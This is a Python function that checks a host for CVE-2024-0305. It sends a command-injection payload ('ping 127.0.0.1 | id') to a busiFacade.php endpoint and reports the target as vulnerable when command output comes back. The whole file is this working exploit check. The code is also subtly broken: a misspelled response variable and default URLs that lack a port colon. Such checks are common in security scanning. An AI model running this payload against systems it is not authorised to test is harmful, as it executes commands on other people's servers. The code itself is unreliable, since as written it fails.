import re
import requests
from lib.headers.headers_handler import user_agents
from lib.color_handler import print_green, print_blue, print_red, print_yellow

def check_CVE_2024_0305(ip, ports=None, timeout=10):
    headers = {"User-Agent": user_agents()}
    protocols = ["http", "https"]
    if ports is None:
        ports = [80]
    else:
        ports = [f":{port}" for port in ports]

    for port in ports:
        for protocol in protocols:
            url = f"{protocol}://{ip}{port}/classes/common/busiFacade.php"
            try:
                data = '''{"name":"ping","serviceName":"SysManager","userTransaction":false,"param":["ping 127.0.0.1 | id"]}'''
                response = requests.post(url, data=data, verify=False, headers=headers, timeout=timeout)
                id_result = re.findall(r"uid=([0-9a-z]+)\s+gid=([0-9a-z]+)", reponse.text)
                if id_result and "#str" in response.text:
                    print_green(f"The target is vulnerable to CVE-2024-0305 : {url}")
                    return True
            except requests.RequestException:
                continue
    return False
